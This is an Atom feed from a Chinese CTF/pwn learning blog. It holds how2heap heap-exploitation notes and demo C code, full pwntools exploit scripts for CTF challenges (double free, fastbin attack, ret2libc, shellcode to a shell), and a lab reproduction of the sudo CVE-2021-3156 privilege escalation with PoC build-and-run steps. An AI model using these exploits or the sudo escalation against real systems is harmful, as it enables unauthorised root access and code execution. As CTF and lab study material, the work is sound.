<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Torebtr&#39;blog</title>
  <icon>https://www.gravatar.com/avatar/f4f4d3b79c164ad8f5622d14b77e0d11</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-08-25T01:28:51.729Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Torebtr</name>
    <email>2338442533@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>how2heap(持续更新)</title>
    <link href="http://example.com/2021/08/25/how2heap/"/>
    <id>http://example.com/2021/08/25/how2heap/</id>
    <published>2021-08-25T01:28:44.000Z</published>
    <updated>2021-08-25T01:28:51.729Z</updated>
    
    <content type="html"><![CDATA[<p>简记how2heap刷题</p><h1 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h1><p>假如我先malloc了一个比较大的堆，然后free掉，当我再申请一个小于刚刚释放的堆的时候，就会申请到刚刚free那个堆的地址。还有就是，我虽然刚刚释放了a指向的堆，但是a指针不会清零，仍然指向那个地址。这里就存在一个uaf（use_after_free)漏洞，原因是free的时候指针没有清零。</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210712154629792.png" alt="image-20210712154629792" loading="lazy"></p><p>自己理解：总共分配了三次，第一次malloc得到的chunk被free掉之后并没有将第一次的指针清空，只是将空间归还。第三次malloc的时候，因为大小比第一次的小，所以将第一次free掉的空间又重新分配了回来，这样当我们输出a和c的时候，都是输出同一个地址的内容。</p><h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a><strong>fastbin_dup</strong></h1><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");    fprintf(stderr, "Allocating 3 buffers.\n");    int *a = malloc(8);    int *b = malloc(8);    int *c = malloc(8);    fprintf(stderr, "1st malloc(8): %p\n", a);    fprintf(stderr, "2nd malloc(8): %p\n", b);    fprintf(stderr, "3rd malloc(8): %p\n", c);    fprintf(stderr, "Freeing the first one...\n");    free(a);    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);    // free(a);    fprintf(stderr, "So, instead, we'll free %p.\n", b);    free(b);    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);    free(a);    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);    fprintf(stderr, "1st malloc(8): %p\n", malloc(8));    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));    fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));}</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713110359555.png" alt="image-20210713110359555" loading="lazy"></p><h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a><strong>fastbin_dup_into_stack</strong></h1><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"           "returning a pointer to a controlled location (in this case, the stack).\n");    unsigned long long stack_var;    fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&amp;stack_var);    fprintf(stderr, "Allocating 3 buffers.\n");    int *a = malloc(8);    int *b = malloc(8);    int *c = malloc(8);    fprintf(stderr, "1st malloc(8): %p\n", a);    fprintf(stderr, "2nd malloc(8): %p\n", b);    fprintf(stderr, "3rd malloc(8): %p\n", c);    fprintf(stderr, "Freeing the first one...\n");    free(a);    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);    // free(a);    fprintf(stderr, "So, instead, we'll free %p.\n", b);    free(b);    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);    free(a);    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);    unsigned long long *d = malloc(8);    fprintf(stderr, "1st malloc(8): %p\n", d);    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));    fprintf(stderr, "Now the free list has [ %p ].\n", a);    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"        "so that malloc will think there is a free chunk there and agree to\n"        "return a pointer to it.\n", a);    stack_var = 0x20;    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);    *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));}</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713110550162.png" alt="image-20210713110550162" loading="lazy"></p><p> 会发现再次申请的时候就把我们伪造的栈空间当malloc来申请了，这其中的要点为将stack_var = 0x20,然后将stack_var -8 的地址赋值到*d处，也就是fastbin的fd处。再次maollc到指向stack+8的堆。</p><h2 id="9447-search-engine"><a href="#9447-search-engine" class="headerlink" title="9447-search-engine"></a>9447-search-engine</h2><p><a href="https://www.freesion.com/article/7775459314/">https://www.freesion.com/article/7775459314/</a></p><p>结构体：</p><pre class="language-none"><code class="language-none">struct word {word ptr //指向每个word的起始地址word size //每个word的大小sentence ptr //指向句子的起始地址sentence size //每一个句子的大小pre_word_ptr //指向上一个word struct的指针}</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210714173134664.png" alt="image-20210714173134664" loading="lazy"></p><p>每个sentence都是用链表的方式存起来的，即句子与句子之间是指针连接</p><p>上面就是word_ptr</p><ol><li>输入word的大小和内容，以输入的大小为size malloc一个堆。</li><li>从最后一个word struct开始找起，通过每个struct的pre_word_ptr一直向前找。</li><li>然后这里有两个check。第一，当前的word_struct的sentence ptr指向的内容不能为空。第二，当前的word_struct中的size字段要和输入的word的size大小一致，并且通过memcmp(word_struct-&gt;word_ptr, word_ptr, size)来比较输入的word内容和当前struct的word ptr指向的内容是否一致。</li><li>通过这两个check之后，分别打印该word struct对应的sentence size和内容。</li><li>询问是否删除句子，如果删除的话，就清空该sentence中的内容，并且把该word_struct中的sentence_ptr指针free掉<br><em><strong>注意这里free之后没有把指针设置为空，存在漏洞，之后可以通过double free来进行一个利用</strong></em></li></ol><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210714174244788.png" alt="image-20210714174244788" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python">#coding=utf-8from pwn import *DEBUG = 1io = process("./pwn")libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")if DEBUG:    context.log_level = "debug"    context.terminal = ["/usr/bin/tmux", "splitw", "-h", "-p", "70"]def index_a_sentence(sentence):    io.recvuntil("Quit\n")    io.sendline("2")    io.recvuntil("size:")    io.sendline(str(len(sentence)))    io.recvuntil("sentence:")    io.sendline(sentence)def seach_word(word):    io.recvuntil("Quit\n")    io.sendline("1")    io.recvuntil("size:")    io.sendline(str(len(word)))    io.recvuntil("word:")    io.sendline(word)def leak():    unsorted_bin_sentece = "s"*0x85 + " m"    index_a_sentence(unsorted_bin_sentece)    seach_word("m")    io.recvuntil("(y/n)?")    io.sendline("y")    seach_word("\x00")    io.recvuntil("Found " + str(len(unsorted_bin_sentece)) + ": ")    main_arena_addr = u64(io.recv(6).ljust(8, "\x00")) - 88    libc_addr = main_arena_addr - 0x3c4b20    io.recvuntil("(y/n)?")    io.sendline("n")    return libc_addr, main_arena_addrlibc_addr, main_arena_addr = leak()print("libc address: " + hex(libc_addr))index_a_sentence("a"*0x5d + " d") #chunk aindex_a_sentence("a"*0x5d + " d") #chunk bindex_a_sentence("a"*0x5d + " d") #chunk cseach_word("d")io.recvuntil("(y/n)?")io.sendline("y") #free cio.recvuntil("(y/n)?")io.sendline("y") #free bio.recvuntil("(y/n)?")io.sendline("y") #free a# fastbins 0x70:  a-&gt;b-&gt;cseach_word("\x00")io.recvuntil("(y/n)?")io.sendline("y") #free b# fastbins 0x70:  b-&gt;a-&gt;b-&gt;....# double free 构建了循环链表io.recvuntil("(y/n)?")io.sendline("n")io.recvuntil("(y/n)?")io.sendline("n")one_gadget_addr = libc_addr + 0xf1147fake_chunk_addr = main_arena_addr - 51payload = p64(fake_chunk_addr).ljust(0x60, "a")index_a_sentence(payload) # return chunk b and edit fd# fastbins: a-&gt;b-&gt;fake_chunk    notice that fake_chunk size should fall in right fastbins indexindex_a_sentence("a"*0x60) # return chunk aindex_a_sentence("a"*0x60) # return chunk b whose fd has been modifiedpayload = ("a"*19 + p64(one_gadget_addr)).ljust(0x60, "a")#gdb.attach(io)index_a_sentence(payload)io.interactive()</code></pre><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017-babyheap"></a>0ctf 2017-babyheap</h2><p><a href="https://uaf.io/assets/0ctfbabyheap">https://uaf.io/assets/0ctfbabyheap</a></p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210726101708896.png" alt="image-20210726101708896" loading="lazy"></p><p><strong>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk  被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack  可以实现有限的地址写能力。</strong></p><h3 id="保护查看"><a href="#保护查看" class="headerlink" title="保护查看"></a>保护查看</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210726093722040.png" alt="image-20210726093722040" loading="lazy"></h3><p>如果<code>RELRO: Partial RELRO</code>, 有可能是格式化字符串。</p><p>保护全开</p><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210726093817807.png" alt="image-20210726093817807" loading="lazy"></p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210726100114599.png" alt="image-20210726100114599" loading="lazy"></p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><h4 id="Leak-Libc"><a href="#Leak-Libc" class="headerlink" title="Leak Libc"></a>Leak Libc</h4><p>无uaf！！！</p><p>利用double free获得指向small bin的ptr，然后利用dump打印出来</p><p> <img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210727153145274.png" alt="image-20210727153145274" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python">#!/usr/bin/env python# -*- coding: UTF-8 -*-from pwn import *p = process("./babyheap")elf=ELF('./babyheap')libc = ELF('/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')#context.log_level='debug'context.terminal = ["tmux","splitw","-h"]context.arch = "amd64"def alloc(size):    p.recvuntil('Command: ')    p.sendline('1')    p.sendline(str(size))def fill(idx,payload):    p.recvuntil('Command: ')    p.sendline('2')     p.sendline(str(idx))    p.sendline(str(len(payload)))    p.send(payload)     def free(idx):    p.recvuntil('Command: ')    p.sendline('3')    p.sendline(str(idx))       def dump(idx):    p.recvuntil('Command: ')     p.sendline('4')    p.sendline(str(idx))        p.recvuntil('Content: \n')        #-------leak main_arena -  unsorted bin attack ------alloc(0x10)#idx0    alloc(0x10)#idx1    alloc(0x30)#idx2    alloc(0x40)#idx3    alloc(0x60)#idx4    fill(0,p64(0x51)*4) #idx1 -&gt; size =0x51fill(2,p64(0x31)*6) #让被free的chunk检查到后面是在用的chunkfree(1) alloc(0x40)#idx1 这个指针还是idx1的位置,但是可以读写 idx2 -&gt;fd 了fill(1,p64(0x91)*4) #将idx2放进unsorted bin中free(2)dump(1)         p.recv(0x20)SBaddr = u64(p.recv(8))p.recvline()malloc_hook=SBaddr-88-0x10success('malloc_hook = '+hex(malloc_hook))#------------ 把malloc_hook申请出来 ---------------------free(4)payload=p64(0)*9+p64(0x71)+p64(malloc_hook-0x23)fill(3,payload)alloc(0x60)#idx2alloc(0x60)#idx4 malloc_hook#----------- 改 malloc_hook ---------------------------libc_addr = malloc_hook-libc.symbols['__malloc_hook']success('libc = '+hex(libc_addr))payload=p64(libc_addr+0x4526a) #0x4526a在下面解释shllcode='a'*0x13+payloadfill(4,shllcode) alloc(1)p.sendline('bash')p.interactive()</code></pre><p>我们需要在 __malloc_hook 写一个函数地址,用来getshell</p><p>0x4526a这个偏移里写的是这东西:</p><pre class="language-asm" data-language="asm"><code class="language-asm">&lt;do_system+1098&gt;:     mov    rax,QWORD PTR [rip+0x37ec47]    &lt;do_system+1105&gt;:     lea    rdi,[rip+0x147adf]              &lt;do_system+1112&gt;:     lea    rsi,[rsp+0x30]&lt;do_system+1117&gt;:     mov    DWORD PTR [rip+0x381219],0x0    &lt;do_system+1127&gt;:     mov    DWORD PTR [rip+0x381213],0x0    &lt;do_system+1137&gt;:     mov    rdx,QWORD PTR [rax]&lt;do_system+1140&gt;:     call   0x7f7f36b27770 &lt;execve&gt;</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210728091824149.png" alt="image-20210728091824149" loading="lazy"></p><h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713162156154.png" alt="image-20210713162156154" loading="lazy"></p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713162142395.png" alt="image-20210713162142395" loading="lazy"></p><p>先申请两个chunk，然后free掉p1，之后申请一个较大的chunk，使p1进入unsort bin然后再次free p1，这样再申请两次与p1大小相同的chunk，所申请的chunk的指针就指向同一个位置。</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713162606814.png" alt="image-20210713162606814" loading="lazy"></p><h2 id="2016-HITCON-CTF-SleepyHolder"><a href="#2016-HITCON-CTF-SleepyHolder" class="headerlink" title="2016 HITCON CTF SleepyHolder"></a>2016 HITCON CTF SleepyHolder</h2><blockquote><p>申请大小超过<code>top chunk size</code>, <code>ptmalloc</code>会整合一些<code>fastbin</code>中的<code>free chunk</code>并入<code>top chunk</code>, 如果还不够就<code>mmap</code>一块新的<code>chunk</code>，这个<code>chunk</code>与原有的<code>top chunk</code>之间采用单链表链接.</p></blockquote><blockquote><p>Fastbin对double free的检查机制是仅仅检查fastbin的头chunk是否与当前要释放的这个相同size的chunk地址一样</p></blockquote><blockquote><p><em><strong>*malloc_consolidate*</strong>***</em>*的功能就是把*<em>*<em>chunk*</em>****</em>*从*<em>*<em>fastbin*</em>****</em>*取出，相邻的*<em>*<em>chunk*</em>****</em>*进行合并，并且会设置下一个*<em>*<em>chunk*</em>****</em>*的*<em>*<em>prev_inuse*</em>****</em>*位为*<em>*<em>0*</em></em>*</p></blockquote><pre class="language-python" data-language="python"><code class="language-python">add(1, 'aaa') #small secretadd(2, 'bbb') #big secretdelete(1)    ------------------add(3, 'ccc') #huge secret    ｜--------&gt; Double Freedelete(1)    ------------------</code></pre><p>简单点来说就是free了一次chunk1，然后申请了一块很大的chunk，chunk1会被取出来然后合并掉，实际上fastbin中没有chunk，此时再free一次就构成double free了</p><h3 id="wiki"><a href="#wiki" class="headerlink" title="wiki"></a>wiki</h3><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210811085900357.png" alt="image-20210811085900357" loading="lazy"></p><blockquote><p>程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。</p></blockquote><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210812114048319.png" alt="image-20210812114048319" loading="lazy"></p><h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h1><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713173742536.png" alt="image-20210713173742536" loading="lazy"></p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210713173838243.png" alt="image-20210713173838243" loading="lazy"></p><p>关键是在globle chunk当中构造fake_chunk，然后完成上图的构造</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a><strong>house_of_spirit</strong></h1><p>通过free一块不可控内存，在进行一次malloc，使其可控</p><p>术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){fprintf(stderr, "This file demonstrates the house of spirit attack.\n");fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");malloc(1);fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");unsigned long long *a;// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");fake_chunks[1] = 0x40; // this is the sizefprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");    // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8fake_chunks[9] = 0x1234; // nextsizefprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]);fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");a = &amp;fake_chunks[2];fprintf(stderr, "Freeing the overwritten pointer.\n");free(a);fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]);fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));}</code></pre><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210714111539082.png" alt="image-20210714111539082" loading="lazy"></p><p>首先用malloc(1)进行了初始化，然后用一个fake_chunks数组来模拟两个fake_chunk，一个位于0下标的位置，一个位于8下标的位置，1下标是第一个chunk的size，9下标是第二个chunk的size。</p><p>因为第一个chunk的大小为64字节，64位系统环境下8字节一个数字，所以从0下标开始，到8下标之前刚好64个字节，那么下一个chunk就正好连在他的后面，所以第二个chunk从8下标位置开始是prev_size,9下标是size，next size的检查要检查下一个chunk的size是否合法，所以9下标size这个值必须是合法的size值，所以给他赋值为合法值。</p><p>然后free第一个chunk，通过了检测之后下一次分配相应大小的chunk就会把这个第一个chunk分配出来了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;简记how2heap刷题&lt;/p&gt;
&lt;h1 id=&quot;first-fit&quot;&gt;&lt;a href=&quot;#first-fit&quot; class=&quot;headerlink&quot; title=&quot;first_fit&quot;&gt;&lt;/a&gt;first_fit&lt;/h1&gt;&lt;p&gt;假如我先malloc了一个比较大的堆，然后f</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>cve_2001_3156</title>
    <link href="http://example.com/2021/03/13/cve-2001-3156/"/>
    <id>http://example.com/2021/03/13/cve-2001-3156/</id>
    <published>2021-03-13T07:34:44.000Z</published>
    <updated>2021-08-24T08:14:30.285Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-sudo权限提升漏洞（CVE-2021-3156）复现"><a href="#Linux-sudo权限提升漏洞（CVE-2021-3156）复现" class="headerlink" title="Linux sudo权限提升漏洞（CVE-2021-3156）复现"></a>Linux sudo权限提升漏洞（CVE-2021-3156）复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h2><p>2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h3><p>Sudo 1.8.2 - 1.8.31p2</p><p>Sudo 1.9.0 - 1.9.5p1</p><h3 id="测试系统是否易受此漏洞影响："><a href="#测试系统是否易受此漏洞影响：" class="headerlink" title="测试系统是否易受此漏洞影响："></a><strong>测试系统是否易受此漏洞影响：</strong></h3><blockquote><ol><li><p>以非root用户身份登录系统。</p></li><li><p>运行命令“sudoedit -s /”</p></li><li><p>如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。</p></li></ol></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境：ubuntu20-04虚拟机，sudo-1-8-31"><a href="#环境：ubuntu20-04虚拟机，sudo-1-8-31" class="headerlink" title="环境：ubuntu20.04虚拟机，sudo 1.8.31"></a>环境：ubuntu20.04虚拟机，sudo 1.8.31</h3><h3 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h3><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824150108325.png" alt="image-20210824150108325" loading="lazy"></p><p>版本符合要求，通过运行命令“sudoedit -s /”检测是否真正存在漏洞</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824150201670.png" alt="image-20210824150201670" loading="lazy"></p><p>经检测漏洞存在</p><p><strong>注：版本符合要求，漏洞不一定存在，</strong>如：</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824150748392.png" alt="image-20210824150748392" loading="lazy"></p><h3 id="Poc地址"><a href="#Poc地址" class="headerlink" title="Poc地址:"></a>Poc地址:</h3><blockquote><p><a href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a></p></blockquote><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>进入目录并执行</p><pre class="language-none"><code class="language-none">cd CVE-2021-3156make./sudo-hax-me-a-sandwich</code></pre><p>make并运行文件</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161257701.png" alt="image-20210824161257701" loading="lazy"></p><p>查看到可用选项，后提升权限<code>./sudo-hax-me-a-sandwich 1</code>                   //结尾的1代表第几个选项</p><p><img src="https://gitee.com/torebtr/cloudimag/raw/master/img/image-20210824161343491.png" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-sudo权限提升漏洞（CVE-2021-3156）复现&quot;&gt;&lt;a href=&quot;#Linux-sudo权限提升漏洞（CVE-2021-3156）复现&quot; class=&quot;headerlink&quot; title=&quot;Linux sudo权限提升漏洞（CVE-2021-</summary>
      
    
    
    
    
    <category term="-CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>mark_of_practice</title>
    <link href="http://example.com/2021/03/13/mark-of-practice/"/>
    <id>http://example.com/2021/03/13/mark-of-practice/</id>
    <published>2021-03-13T07:33:44.000Z</published>
    <updated>2021-08-24T06:26:05.841Z</updated>
    
    <content type="html"><![CDATA[<p>最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。</p><h1 id="水题："><a href="#水题：" class="headerlink" title="水题："></a>水题：</h1><h2 id="ret2libc：buu-ciscn-2019-en-2"><a href="#ret2libc：buu-ciscn-2019-en-2" class="headerlink" title="ret2libc：buu ciscn_2019_en_2"></a>ret2libc：buu ciscn_2019_en_2</h2><pre class="language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context.os='linux' context.arch='amd64' context.log_level='debug' p = remote('node3.buuoj.cn',26863)#p = process('./ciscn_2019_en_2')elf = ELF('./ciscn_2019_en_2')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x400B28#ROPgadget查找ret = 0x00400C84pop_rdi = 0x00400c83 # pop rdi ; retp.sendlineafter('choice!\n','1')#payload = flat(['\0', 'a'*0x57, pop_di, puts_got, puts_plt, main_addr])payload = 'a'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter('encrypted\n',payload)p.recvline()p.recvline()#puts_addr = u64(r.recv(8))puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))#puts_addr= u64(r.recvline()[:-1].ljust(8, '\x00'))#print(puts_addr)#print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libcbase = puts_addr - libc.dump('puts')sys_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')p.sendlineafter('choice!\n','1')#payload = flat(['\0', 'a'*0x57, ret,  pop_di, binsh_addr, sys_addr])payload = 'a'*0x58+ p64(ret)+  p64(pop_rdi)+ p64(binsh_addr)+ p64(sys_addr)p.sendlineafter('encrypted\n',payload)p.interactive()</code></pre><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><pre class="language-python" data-language="python"><code class="language-python">from pwn import*r=remote('node3.buuoj.cn',26025)shell_addr=0x4006e6r.sendline('100')payload='a'*(0x10+8)+p64(shell_addr)r.sendline(payload)r.interactive()</code></pre><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><pre class="language-python" data-language="python"><code class="language-python">from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')#p = process('./babyrop')p = remote('node3.buuoj.cn',26310)#0x00400683 : pop rdi ; retpop_rdi = 0x00400683sys_addr = 0x004005E3bin_sh_addr = 0x00601048payload = 'a'*0x18 + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)p.sendline(payload)p.interactive()</code></pre><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><pre class="language-python" data-language="python"><code class="language-python">#coding=utf-8from pwn import *context(os='linux',arch='amd64', log_level = 'debug')#sh = process('./ciscn_2019_n_5')sh = remote('node3.buuoj.cn',25696)elf = ELF('./ciscn_2019_n_5')bss_addr = 0x601080#shellcode ="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"shellcode = asm(shellcraft.sh())#生成64位linuxshellcodepayload = 'a'*0x28 + p64(bss_addr)#栈溢出ret到shellcode执行sh.sendlineafter("name\n",shellcode)sh.sendlineafter("me?\n",payload)sh.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在入门堆，但是基础实在有点多，可是不会基础的话又看不懂题，所以堆的题也没怎么搞，只能刷点简单题来水，生活不易啊。&lt;/p&gt;
&lt;h1 id=&quot;水题：&quot;&gt;&lt;a href=&quot;#水题：&quot; class=&quot;headerlink&quot; title=&quot;水题：&quot;&gt;&lt;/a&gt;水题：&lt;/h1&gt;&lt;h2</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>problem_blog</title>
    <link href="http://example.com/2021/03/13/problem-blog/"/>
    <id>http://example.com/2021/03/13/problem-blog/</id>
    <published>2021-03-13T07:32:22.000Z</published>
    <updated>2021-03-13T07:58:36.728Z</updated>
    
